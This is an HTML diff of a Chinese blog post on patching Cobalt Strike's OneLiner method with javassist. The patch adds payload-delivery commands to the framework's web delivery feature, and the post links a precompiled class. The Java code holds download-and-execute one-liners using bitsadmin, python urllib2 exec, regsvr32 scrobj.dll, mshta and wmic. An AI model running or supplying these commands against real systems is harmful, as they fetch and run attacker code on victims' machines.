@@ -1,4 +1,21 @@
-<!DOCTYPE html><html class="theme-next pisces use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0">
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
@@ -68,7 +85,7 @@
     back2top_sidebar: false,
     fancybox: true,
     fastclick: true,
-    lazyload: true,
+    lazyload: false,
     tabs: true,
     motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
     algolia: {
@@ -92,20 +109,20 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="Cobal Strike 自定义OneLiner">
 <meta property="og:url" content="https://evi1cg.github.io/archives/Custom_Oneliner.html">
-<meta property="og:site_name" content="Evi1cg's blog">
+<meta property="og:site_name" content="Evi1cg&#39;s blog">
 <meta property="og:description" content="0x00 起因在使用Cobal Strike的过程中，我们可以看到里面已经集成了几种 Script Web Delivery，如下图：  而且在生成以后打开site,只需要点击Copy URL就可以把命令复制出来，再写aggressor脚本时也想要实现这个功能，发现copy以后只有url，并没有命令，所以为了一探究竟，还是把CS解压，grep了一把，定位到common.CommonUtils，发现">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2018/06/1971275379.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2018/06/93915533.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2018/06/642698054.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2018/06/954541639.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2018/06/3152049107.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2018/06/aaaa.gif">
 <meta property="og:updated_time" content="2019-01-16T05:15:06.566Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Cobal Strike 自定义OneLiner">
 <meta name="twitter:description" content="0x00 起因在使用Cobal Strike的过程中，我们可以看到里面已经集成了几种 Script Web Delivery，如下图：  而且在生成以后打开site,只需要点击Copy URL就可以把命令复制出来，再写aggressor脚本时也想要实现这个功能，发现copy以后只有url，并没有命令，所以为了一探究竟，还是把CS解压，grep了一把，定位到common.CommonUtils，发现">
-<meta name="twitter:image" content="https://evi1cg.github.io/images/loading.svg">
+<meta name="twitter:image" content="https://evi1cg.github.io/usr/uploads/2018/06/1971275379.png">
 
 
 
@@ -485,22 +502,22 @@
       
 
       
-        <meta name="generator" content="Hexo 3.9.0"><h2 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00 起因"></a>0x00 起因</h2><p>在使用Cobal Strike的过程中，我们可以看到里面已经集成了几种 Script Web Delivery，如下图：</p>
-<p></p><div class="progress-images" style="width:746px"><div class="progress-images--placeholder" style="padding-bottom: 34.048257372654156%;"></div><img src="/images/loading.svg" alt="19484-drjxyu0m4wg.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2018/06/1971275379.png" data-thumb="/images/thumb/ef69021d0b28bc523d3f112f4627a48e.png"></div><p></p>
-<p>而且在生成以后打开site,只需要点击<code>Copy URL</code>就可以把命令复制出来，再写aggressor脚本时也想要实现这个功能，发现copy以后只有url，并没有命令，所以为了一探究竟，还是把CS解压，grep了一把，定位到common.CommonUtils，发现了OneLiner方法：<br></p><div class="progress-images" style="width:1824px"><div class="progress-images--placeholder" style="padding-bottom: 35.416666666666664%;"></div><img src="/images/loading.svg" alt="73927-nvotona7nxc.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2018/06/93915533.png" data-thumb="/images/thumb/35b7735c293090286a9a40538c35460a.png"></div><p></p>
+        <h2 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00 起因"></a>0x00 起因</h2><p>在使用Cobal Strike的过程中，我们可以看到里面已经集成了几种 Script Web Delivery，如下图：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2018/06/1971275379.png" alt="19484-drjxyu0m4wg.png"></p>
+<p>而且在生成以后打开site,只需要点击<code>Copy URL</code>就可以把命令复制出来，再写aggressor脚本时也想要实现这个功能，发现copy以后只有url，并没有命令，所以为了一探究竟，还是把CS解压，grep了一把，定位到common.CommonUtils，发现了OneLiner方法：<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/93915533.png" alt="73927-nvotona7nxc.png"></p>
 <p>所以要实现这个功能我们就需要对这个class进行修改，增加我们想要的命令。</p>
 <h2 id="0x01-使用javassist修改class"><a href="#0x01-使用javassist修改class" class="headerlink" title="0x01 使用javassist修改class"></a>0x01 使用javassist修改class</h2><p>Javassist是一个能够操作字节码框架，通过它我们能很轻易的修改class代码。首先下载<a href="https://github.com/jboss-javassist/javassist/releases" target="_blank" rel="noopener">javassist</a> ，新建一个java工程，右键工程导入javassist包。</p>
-<p></p><div class="progress-images" style="width:1206px"><div class="progress-images--placeholder" style="padding-bottom: 70.14925373134328%;"></div><img src="/images/loading.svg" alt="15585-gsx22q9953w.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2018/06/642698054.png" data-thumb="/images/thumb/144aedab7e385ad40d4c7dda60bfacf1.png"></div><p></p>
-<p>我们可能常用<code>mshta http://host/test.png</code> 的方式来请求payload，可以使用一下代码进行添加：<br></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> changeclass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.CannotCompileException;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">change</span> </span>{</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>{</span><br><span class="line">			updateMethod();</span><br><span class="line">		}</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">updateMethod</span><span class="params">()</span></span>{</span><br><span class="line">			<span class="keyword">try</span> {</span><br><span class="line">				ClassPool cPool = <span class="keyword">new</span> ClassPool(<span class="keyword">true</span>);</span><br><span class="line">			        <span class="comment">//如果该文件引入了其它类，需要利用类似如下方式声明</span></span><br><span class="line">				<span class="comment">//cPool.importPackage("java.util.List");</span></span><br><span class="line">				</span><br><span class="line">				<span class="comment">//设置cobaltstrike.jar文件的位置</span></span><br><span class="line">				cPool.insertClassPath(<span class="string">"/tmp/cobaltstrike.jar"</span>);</span><br><span class="line">				</span><br><span class="line">				<span class="comment">//获取该要修改的class对象</span></span><br><span class="line">				CtClass cClass = cPool.get(<span class="string">"common.CommonUtils"</span>);</span><br><span class="line">				</span><br><span class="line">				<span class="comment">//获取到对应的方法</span></span><br><span class="line">				CtMethod cMethod = cClass.getDeclaredMethod(<span class="string">"OneLiner"</span>);</span><br><span class="line">				</span><br><span class="line">				<span class="comment">//更改该方法的内部实现</span></span><br><span class="line">				<span class="comment">//需要注意的是对于参数的引用要以$开始，不能直接输入参数名称</span></span><br><span class="line">				cMethod.setBody(<span class="string">"{ if (\"bitsadmin\".equals($2)) {"</span></span><br><span class="line">						+ <span class="string">"String f = garbage(\"temp\");"</span></span><br><span class="line">						+ <span class="string">"return \"cmd.exe /c bitsadmin /transfer \" + f + \" \" + $1 + \" %APPDATA%\\\\\" + f + \".exe&%APPDATA%\\\\\" + f + \".exe&del %APPDATA%\\\\\" + f + \".exe\";}"</span></span><br><span class="line">						+ <span class="string">"if (\"powershell\".equals($2)) {"</span></span><br><span class="line">						+ <span class="string">"return PowerShellOneLiner($1);}"</span></span><br><span class="line">						+ <span class="string">"if (\"python\".equals($2)) {"</span></span><br><span class="line">						+ <span class="string">"return \"python -c \\\"import urllib2; exec urllib2.urlopen('\" + $1 + \"').read();\\\"\";}"</span></span><br><span class="line">						+ <span class="string">"if (\"regsvr32\".equals($2)) {"</span></span><br><span class="line">						+ <span class="string">"return \"regsvr32 /s /n /u /i:\" + $1 + \" scrobj.dll\";}"</span></span><br><span class="line">						+ <span class="string">"if (\"mshta\".equals($2)) {"</span></span><br><span class="line">						+ <span class="string">"return \"mshta \" + $1;}"</span></span><br><span class="line">						+ <span class="string">"if (\"wmic\".equals($2)) {"</span></span><br><span class="line">						+ <span class="string">"  return \"wmic os get /format:\\\"\" + $1 + \"\\\"\";}"</span></span><br><span class="line">						+ <span class="string">"print_error(\"'\" + $2 + \"' for URL '\" + $1 + \"' does not have a one-liner\");"</span></span><br><span class="line">						+ <span class="string">"throw new RuntimeException(\"'\" + $2 + \"' for URL '\" + $1 + \"' does not have a one-liner\");}"</span>);</span><br><span class="line">				</span><br><span class="line">				<span class="comment">//修改以后输出目录</span></span><br><span class="line">				cClass.writeFile(<span class="string">"/tmp/"</span>);</span><br><span class="line">				</span><br><span class="line">				System.out.println(<span class="string">"=======修改方法完========="</span>);</span><br><span class="line">			} <span class="keyword">catch</span> (NotFoundException e) {</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			} <span class="keyword">catch</span> (CannotCompileException e) {</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			} <span class="keyword">catch</span> (IOException e) {</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			}</span><br><span class="line">		}</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2018/06/642698054.png" alt="15585-gsx22q9953w.png"></p>
+<p>我们可能常用<code>mshta http://host/test.png</code> 的方式来请求payload，可以使用一下代码进行添加：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> changeclass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.CannotCompileException;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">change</span> </span>&#123;</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">			updateMethod();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">updateMethod</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				ClassPool cPool = <span class="keyword">new</span> ClassPool(<span class="keyword">true</span>);</span><br><span class="line">			        <span class="comment">//如果该文件引入了其它类，需要利用类似如下方式声明</span></span><br><span class="line">				<span class="comment">//cPool.importPackage("java.util.List");</span></span><br><span class="line">				</span><br><span class="line">				<span class="comment">//设置cobaltstrike.jar文件的位置</span></span><br><span class="line">				cPool.insertClassPath(<span class="string">"/tmp/cobaltstrike.jar"</span>);</span><br><span class="line">				</span><br><span class="line">				<span class="comment">//获取该要修改的class对象</span></span><br><span class="line">				CtClass cClass = cPool.get(<span class="string">"common.CommonUtils"</span>);</span><br><span class="line">				</span><br><span class="line">				<span class="comment">//获取到对应的方法</span></span><br><span class="line">				CtMethod cMethod = cClass.getDeclaredMethod(<span class="string">"OneLiner"</span>);</span><br><span class="line">				</span><br><span class="line">				<span class="comment">//更改该方法的内部实现</span></span><br><span class="line">				<span class="comment">//需要注意的是对于参数的引用要以$开始，不能直接输入参数名称</span></span><br><span class="line">				cMethod.setBody(<span class="string">"&#123; if (\"bitsadmin\".equals($2)) &#123;"</span></span><br><span class="line">						+ <span class="string">"String f = garbage(\"temp\");"</span></span><br><span class="line">						+ <span class="string">"return \"cmd.exe /c bitsadmin /transfer \" + f + \" \" + $1 + \" %APPDATA%\\\\\" + f + \".exe&amp;%APPDATA%\\\\\" + f + \".exe&amp;del %APPDATA%\\\\\" + f + \".exe\";&#125;"</span></span><br><span class="line">						+ <span class="string">"if (\"powershell\".equals($2)) &#123;"</span></span><br><span class="line">						+ <span class="string">"return PowerShellOneLiner($1);&#125;"</span></span><br><span class="line">						+ <span class="string">"if (\"python\".equals($2)) &#123;"</span></span><br><span class="line">						+ <span class="string">"return \"python -c \\\"import urllib2; exec urllib2.urlopen('\" + $1 + \"').read();\\\"\";&#125;"</span></span><br><span class="line">						+ <span class="string">"if (\"regsvr32\".equals($2)) &#123;"</span></span><br><span class="line">						+ <span class="string">"return \"regsvr32 /s /n /u /i:\" + $1 + \" scrobj.dll\";&#125;"</span></span><br><span class="line">						+ <span class="string">"if (\"mshta\".equals($2)) &#123;"</span></span><br><span class="line">						+ <span class="string">"return \"mshta \" + $1;&#125;"</span></span><br><span class="line">						+ <span class="string">"if (\"wmic\".equals($2)) &#123;"</span></span><br><span class="line">						+ <span class="string">"  return \"wmic os get /format:\\\"\" + $1 + \"\\\"\";&#125;"</span></span><br><span class="line">						+ <span class="string">"print_error(\"'\" + $2 + \"' for URL '\" + $1 + \"' does not have a one-liner\");"</span></span><br><span class="line">						+ <span class="string">"throw new RuntimeException(\"'\" + $2 + \"' for URL '\" + $1 + \"' does not have a one-liner\");&#125;"</span>);</span><br><span class="line">				</span><br><span class="line">				<span class="comment">//修改以后输出目录</span></span><br><span class="line">				cClass.writeFile(<span class="string">"/tmp/"</span>);</span><br><span class="line">				</span><br><span class="line">				System.out.println(<span class="string">"=======修改方法完========="</span>);</span><br><span class="line">			&#125; <span class="keyword">catch</span> (NotFoundException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125; <span class="keyword">catch</span> (CannotCompileException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <blockquote>
-<p>在这里要注意的是，方法 OneLiner(String url, String type)有两个参数，方法中的参数从 <code>$1</code> 开始，若该方法为非 static 方法，可以用 <code>$0</code> 来表示该方法实例自身，若该方法为 static 方法，则 <code>$0</code> 不可用。而且写的代码需要将<code>"</code>, <code>\</code> 进行转义。</p>
+<p>在这里要注意的是，方法 OneLiner(String url, String type)有两个参数，方法中的参数从 <code>$1</code> 开始，若该方法为非 static 方法，可以用 <code>$0</code> 来表示该方法实例自身，若该方法为 static 方法，则 <code>$0</code> 不可用。而且写的代码需要将<code>&quot;</code>, <code>\</code> 进行转义。</p>
 </blockquote>
-<p>运行此代码，可成功生成一个新的class:<br></p><div class="progress-images" style="width:1848px"><div class="progress-images--placeholder" style="padding-bottom: 56.70995670995671%;"></div><img src="/images/loading.svg" alt="39332-5o637aqvh1.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2018/06/954541639.png" data-thumb="/images/thumb/7899c2f20b7f5566fe2d30d4e0ba97cd.png"></div><p></p>
-<p></p><div class="progress-images" style="width:1214px"><div class="progress-images--placeholder" style="padding-bottom: 21.087314662273474%;"></div><img src="/images/loading.svg" alt="41077-02rq3jqomynr.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2018/06/3152049107.png" data-thumb="/images/thumb/c747b6a65f55269e8b501b02f3bf25b9.png"></div><p></p>
+<p>运行此代码，可成功生成一个新的class:<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/954541639.png" alt="39332-5o637aqvh1.png"></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2018/06/3152049107.png" alt="41077-02rq3jqomynr.png"></p>
 <p>将此class替换CS中的class就好了。</p>
-<p>使用的时候只需要在aggressor中site_host中指定即可，例如使用wmic<br></p><figure class="highlight cos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site_host(<span class="built_in">%options</span>[<span class="string">"host"</span>], <span class="built_in">%options</span>[<span class="string">"port"</span>], <span class="built_in">%options</span>[<span class="string">"uri"</span>], <span class="built_in">$data</span>, <span class="string">"text/plain"</span>, <span class="string">"Scripted Web Delivery (wmic)"</span>)<span class="comment">;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>使用mshta<br></p><figure class="highlight cos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site_host(<span class="built_in">%options</span>[<span class="string">"host"</span>], <span class="built_in">%options</span>[<span class="string">"port"</span>], <span class="built_in">%options</span>[<span class="string">"htauri"</span>], <span class="built_in">$htadata</span>, <span class="string">"application/hta"</span>, <span class="string">"Scripted Web Delivery (mshta)"</span>)<span class="comment">;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>效果如下：<br></p><div class="progress-images" style="width:998px"><div class="progress-images--placeholder" style="padding-bottom: 69.03807615230461%;"></div><img src="/images/loading.svg" alt="aaa" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2018/06/aaaa.gif" data-thumb="/images/thumb/d67b7a65e7abd3ab13da322b1e6af68b.gif"></div><p></p>
+<p>使用的时候只需要在aggressor中site_host中指定即可，例如使用wmic<br><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site_host(<span class="built_in">%options</span>[<span class="string">"host"</span>], <span class="built_in">%options</span>[<span class="string">"port"</span>], <span class="built_in">%options</span>[<span class="string">"uri"</span>], <span class="built_in">$data</span>, <span class="string">"text/plain"</span>, <span class="string">"Scripted Web Delivery (wmic)"</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
+<p>使用mshta<br><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site_host(<span class="built_in">%options</span>[<span class="string">"host"</span>], <span class="built_in">%options</span>[<span class="string">"port"</span>], <span class="built_in">%options</span>[<span class="string">"htauri"</span>], <span class="built_in">$htadata</span>, <span class="string">"application/hta"</span>, <span class="string">"Scripted Web Delivery (mshta)"</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
+<p>效果如下：<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/aaaa.gif" alt="aaa"></p>
 <p>已经编译好的class可以从这里下载：</p>
 <p>GIT : <a href="https://github.com/ridter/CS_Chinese_support" target="_blank" rel="noopener">CS_Chinese_support</a></p>
 
@@ -856,7 +873,7 @@
                   
                     
                   
-                  <a href="https://github.com/Ridter" title="GitHub → https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -867,7 +884,7 @@
                   
                     
                   
-                  <a href="https://twitter.com/Evi1cg" title="Twitter → https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -878,7 +895,7 @@
                   
                     
                   
-                  <a href="https://weibo.com/Ridter" title="微博 → https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -889,7 +906,7 @@
                   
                     
                   
-                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail → mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                 </span>
               
             </div>
@@ -941,7 +958,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">© 2015 – <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
   <span class="with-love" id="animate">
     <i class="fa fa-heart"></i>
   </span>
@@ -1003,8 +1020,6 @@
 
 
 
-  
-
 
 
 
@@ -1033,9 +1048,6 @@
 
   
   <script src="//cdn.jsdelivr.net/npm/fastclick@1/lib/fastclick.min.js"></script>
-
-  
-  <script src="//cdn.jsdelivr.net/npm/jquery-lazyload@1/jquery.lazyload.min.js"></script>
 
   
   <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
@@ -1479,11 +1491,6 @@
   
 
   
-  
-  
-  <script src="/lib/pangu/dist/pangu.min.js?v=3.3"></script>
-  <script>pangu.spacingPage();</script>
-
 
   
 
@@ -1623,6 +1630,5 @@
   <script>
   $("body").backstretch("https://blogpics-1251691280.file.myqcloud.com/imgs/20190121234042.jpg");
   </script>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script>
-
-<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script></body>
+</html>
